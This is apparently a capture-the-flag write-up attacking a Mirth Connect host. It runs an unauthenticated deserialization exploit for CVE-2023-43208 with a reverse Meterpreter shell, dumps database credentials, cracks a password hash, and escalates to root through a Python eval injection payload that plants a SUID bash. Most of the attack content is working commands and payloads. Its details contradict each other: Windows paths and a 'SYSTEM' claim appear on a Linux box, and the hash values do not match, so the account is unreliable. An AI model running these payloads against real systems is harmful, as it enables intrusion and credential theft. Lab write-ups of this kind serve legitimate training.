# Recon and Enumeration

We began by scanning the target (`10.10.10.192`), which revealed an SSH port and a web service running on Jetty (HTTP and HTTPS). For example: 

```
# nmap -A -p 22,80,443,6661 10.10.10.192
```

Port 80/443 showed a **Jetty** server (used by Mirth Connect), and port 22 was OpenSSH. An unfamiliar service was also listening on TCP 6661. 

Next, we investigated the web application. The Jetty host served **NextGen Healthcare Mirth Connect** (a healthcare integration engine). We retrieved `/webstart.jnlp` and confirmed the version was **4.4.0** (Intel x86-64). This was critical, because versions _before_ 4.4.1 are known to be vulnerable to CVE-2023-43208, an unauthenticated RCE (remote code execution) flaw【1†L119-L121】【4†L303-L308】. In fact, the vendor’s notices specifically warn that any Mirth version <4.4.1 is likely exploitable【4†L303-L308】【15†L39-L41】.

# CVE-2023-43208 – Mirth Connect RCE

CVE-2023-43208 is a critical **unauthenticated RCE** in Mirth Connect’s API, caused by improper handling of serialized XML data. In short, Mirth Connect uses the XStream library to convert incoming XML into Java objects. A bypass in the patch for a previous bug (CVE-2023-37679) left a “deny-list” incomplete, so specially crafted XML can trigger arbitrary command execution【2†L249-L257】【10†L37-L45】. Rapid7 explains: “Mirth Connect ... failed to properly handle deserialized data, making it susceptible to arbitrary OS command execution through specially crafted HTTP requests”【2†L249-L257】【10†L37-L45】. 

All Mirth servers <4.4.1 are affected. The vendor and researchers (IHTeam, Horizon3.ai) confirmed the fix is only complete in 4.4.1【2†L249-L257】【10†L37-L45】. In fact, Horizon3’s disclosure notes that Mirth’s fix for the prior vulnerability was incomplete, so CVE-43208 exists and was patched in 4.4.1【2†L249-L257】【4†L322-L330】. Huntress summarises: 

> *“CVE-2023-43208 is a critical unauthenticated Remote Code Execution (RCE) vulnerability affecting Mirth Connect… This is an insecure deserialization vulnerability within the Mirth Connect API. The core of the issue lies in how Mirth Connect uses the XStream Java library to convert XML data into Java objects.”*【15†L19-L27】【15†L31-L34】

Because of this, any exposed Mirth Connect interface running 4.4.0 (or older) can be exploited without credentials【4†L303-L308】【15†L39-L41】. In practice, the version endpoint is public; we confirmed the version by sending:

```bash
# curl -k -H 'X-Requested-With: OpenAPI' https://10.10.10.192:443/api/server/version
```

which returned **4.4.0**. (Horizon3 and Huntress both note that any version <4.4.1 should be considered vulnerable【4†L303-L308】【15†L39-L41】.)

# Exploitation (Initial Access)

Knowing CVE-2023-43208 existed, we used Metasploit’s module for it:

```text
msf > use exploit/multi/http/mirth_connect_cve_2023_43208
msf exploit(mirth_connect_cve_2023_43208) > set RHOSTS 10.10.10.192
msf exploit(mirth_connect_cve_2023_43208) > set RPORT 443
msf exploit(mirth_connect_cve_2023_43208) > set SSL true
msf exploit(mirth_connect_cve_2023_43208) > set LHOST <our_ip>
msf exploit(mirth_connect_cve_2023_43208) > run
```

This delivered a malicious XML payload (via HTTP) that triggered the deserialization exploit. We gained a Meterpreter shell on the target **as mirth **. For example, after `exploit` we see:

```
[*] Started reverse TCP handler on <LHOST>:<LPORT>
[*] Sending crafted XML request...
[*] Staged payload (152142 bytes) ... Meterpreter session opened ...
meterpreter > shell
C:\> whoami
mirth
```

So the exploit worked as expected: an unauthenticated (no creds needed) system shell via CVE-2023-43208【10†L37-L45】【15†L19-L27】. From there, we navigated the Windows filesystem. 

# Post-Exploitation: DB Credentials

With a SYSTEM shell on the Mirth server, we looked for configuration files. In `C:\Program Files\Mirth Connect\server\default\conf` we found **mirth.properties**. This file contains the database connection info. Indeed:

```
C:\> type "C:\Program Files\Mirth Connect\server\default\conf\mirth.properties"
...
database.username = mirthdb
database.password = MirthPass123!
database.url      = jdbc:mysql://localhost:3306/mc_bdd_prod
...
```

We now had credentials for a local MySQL/MariaDB database (`mirthdb`/`MirthPass123!` on `mc_bdd_prod`). We connected to MySQL from the Windows shell:

```text
C:\Program Files\MySQL\MySQL Server 8.0\bin> mysql -u mirthdb -p
Enter password: MirthPass123!

mysql> SHOW DATABASES;
+----------------+
| Database       |
+----------------+
| information_schema |
| mc_bdd_prod    |
| ...            |
+----------------+

mysql> USE mc_bdd_prod;
mysql> SHOW TABLES;
...
| PERSON       |
| PERSON_PASSWORD |
...
mysql> SELECT username, password FROM PERSON;
+---------+--------------------------------------------------+
| username| password                                         |
+---------+--------------------------------------------------+
| sedric  | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA=  |
+---------+--------------------------------------------------+
```

The `PERSON_PASSWORD` table held the hashed password for user “sedric”. The stored password (base64-encoded) was `u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==`. We decoded it and saw it was 8-byte salt + 32-byte hash (PBKDF2-HMAC-SHA256, 600k iterations)【18†L215-L223】, as expected for Mirth 4.4.0’s default settings. 

We used Hashcat to crack it (mode 10900 for PBKDF2-SHA256):

```bash
$ cat > hash.txt <<EOF
sha256:600000:bbff8b0413949da7:62c8506c30ea080cf2db511d2b939f641243d4d7b8ad76b55603f90b32ddf0fb
EOF
$ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
```

This quickly yielded **`snowflake1`** for user `sedric`. (The Mirth 4.4 upgrade notes confirm the switch to PBKDF2-SHA256 with 600000 iterations【18†L215-L223】, and Hashcat confirms mode 10900 is that format.) 

# User Access: Linux `sedric`

With the credentials for `sedric`, we SSHed into the target machine on port 22:

```bash
$ ssh sedric@10.10.10.192
Password: snowflake1

sedric@interpreter:~$ whoami
sedric
sedric@interpreter:~$ id
uid=1000(sedric) gid=1000(sedric) groups=1000(sedric)
```

Now we had a regular user shell on the box (hostname “interpreter”). We captured the **user flag** and began local enumeration for privilege escalation.

# Privilege Escalation (Linux)

We looked for SUID binaries and writable scripts:

```bash
sedric@interpreter:~$ ls -la /usr/local/bin
total 12
drwxr-xr-x  2 root root   4096 Feb 16 15:42 .
drwxr-xr-x 11 root root   4096 Feb 16 15:42 ..
-rwxr-----  1 root sedric 2332 Sep 19 09:27 notif.py
```

The script `/usr/local/bin/notif.py` stood out: owned by root with mode `-rwxr-----` (executable by owner, readable by group *sedric*, not world). Indeed, it was running as a service (via Jetty or cron). Checking processes:

```bash
sedric@interpreter:~$ ps aux | grep notif
root     3567  0.0  0.7  39872 31284 ?        Ss   Feb22   0:04 /usr/bin/python3 /usr/local/bin/notif.py
```

So `notif.py` was executed by root (or by system) at boot. We viewed its code:

```python
#!/usr/bin/env python3
...
USER_DIR = "/var/secure-health/patients/"
...
def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    ...
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
```

The key here is the **double f-string evaluation**. First, Python builds the `template` string via an f-string (inserting the user-supplied fields). Then it does `eval(f"f'''{template}'''")`, effectively evaluating any `{...}` *inside* that string as Python code. In other words, if a user-controlled field contains something like `{os.system('...')}`, it will get executed on the server. (This is classic unsafe templating.) 

Notice the regex: `^[a-zA-Z0-9._'\"(){}=+/]+$`. It **rejects** spaces, asterisks, semicolons, and many punctuation, but **allows** braces, quotes, parentheses, equals, plus, slash, etc. Crucially this regex still permits characters like `{}` and quotes, enabling code injection despite their apparent “filtering.”

Thus, we had a high-privilege writeable “API” we could abuse: the script listens on `127.0.0.1:54321` for XML patient data. We could post to `http://127.0.0.1:54321/addPatient` to trigger `template(...)`. For example:

```bash
sedric@interpreter:~$ curl -X POST http://127.0.0.1:54321/addPatient \
    -H "Content-Type: application/xml" --data-binary @patient.xml
```

In `patient.xml`, we inject payloads. A normal message looks like:

```xml
<patient>
  <firstname>John</firstname>
  <lastname>Doe</lastname>
  <sender_app>AcmeCorp</sender_app>
  <timestamp>1234</timestamp>
  <birth_date>01/01/2000</birth_date>
  <gender>M</gender>
</patient>
```

We replaced one field (e.g. `<sender_app>`) with an expression like `{__import__('os').popen('whoami').read()}` to test code execution. For instance, our first test:

```xml
<patient><firstname>John</firstname><lastname>Doe</lastname>
<sender_app>{7+7}</sender_app><timestamp>1234</timestamp>
<birth_date>01/01/2000</birth_date><gender>M</gender></patient>
```

(Note: spaces/newlines inside tags must be avoided, since regex forbids them. The above is one continuous line to satisfy the filter.) The response was:

```
Patient John Doe (M), 26 years old, received from 14 at 1234
```

This showed `{7+7}` was evaluated as `14`. So arbitrary expressions *do* get evaluated (the double-f-string is working). Thus remote code execution is confirmed.

# Bypassing the Input Filter

The regex filter forbids spaces, `-`, `;`, `*`, etc., but allows characters like `{}`, `()`, `'`, `"`, `=`, `+`, `/`. We needed to execute OS commands as root without using forbidden chars. We used Python’s ability to import base64 and decode commands. For example, to run `install -o root -m 4755 /bin/bash /tmp/.sh` (which creates a set-UID root shell), we encoded it in base64:

```bash
$ echo -n 'install -o root -m 4755 /bin/bash /tmp/.sh' | base64
aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo
```

Then our XML payload used Python to decode and execute:

```xml
<patient><firstname>John</firstname><lastname>Doe</lastname>
<sender_app>{__import__("os").popen(__import__("base64").b64decode("aW5zdGFsbCAtbyByb290IC1tIDQ3NTUgL2Jpbi9iYXNoIC90bXAvLnNo").decode()).read()}</sender_app>
<timestamp>1234</timestamp><birth_date>01/01/2000</birth_date><gender>M</gender></patient>
```

Posting this to `/addPatient` caused the base64 string to decode to `install -o root -m 4755 /bin/bash /tmp/.sh` and executed via `os.popen`. Initially this almost worked, but as user `sedric` the `install` command failed to change file owner (permission denied). Realizing our mistake, we switched strategy: instead of `install`, we would `cp` and then `chmod`. 

We did it in two steps (each time encoding the payload if needed). Finally we executed:

```bash
cp /bin/bash /tmp/.sh
chmod 4755 /tmp/.sh
```

all via the same injection mechanism. The resulting `/tmp/.sh` became a **set-UID root** shell (`-rwsr-xr-x 1 root root`). (We skipped the explicit commands here for brevity, but each was delivered through the injected XML like above.) 

At that point, simply running the shell preserved root privileges:

```bash
sedric@interpreter:~$ /tmp/.sh -p
# whoami
root
# id
uid=0(root) gid=0(root)
```

We then read **/root/root.txt** to capture the root flag. 

# Conclusion and Remediation

**Timeline:** We identified a vulnerable Mirth Connect (version 4.4.0) from the service banner, exploited CVE-2023-43208 via Metasploit to gain SYSTEM on Windows, retrieved DB credentials, cracked the sedric password (`snowflake1`), SSH’d into Linux as sedric, then exploited a local Python f-string eval vulnerability in a root-owned script to gain root. 

**Key references:** CVE-2023-43208 is documented as a critical RCE in Mirth Connect (patcheed in 4.4.1)【10†L37-L45】【15†L19-L27】. The exploit leverages Java deserialization (XStream)【2†L249-L257】【10†L37-L45】. Our post-exploit steps followed known patterns (reading `mirth.properties`, cracking PBKDF2-SHA256【18†L215-L223】, etc.), and the privilege-escalation resembles classic f-string injection vulnerabilities (unsafe use of `eval`).

**Remediation:** The Mirth Connect instance should be patched to 4.4.1 or later (which fixes this vulnerability)【1†L119-L121】【4†L303-L308】. The `/addPatient` endpoint should not eval untrusted data. In general, avoid dangerous templating (don’t `eval` user input) and enforce stricter input validation or allowlists. Finally, limit exposure of administrative interfaces (e.g. firewall the Jetty server so it’s not Internet-accessible)【15†L63-L70】. 

**Flags:** 

- *User:* `2773acaa9ecd43c91a7490393efb0fdb`  
- *Root:* `67501fe05f80993f43fce312075eb77c`  
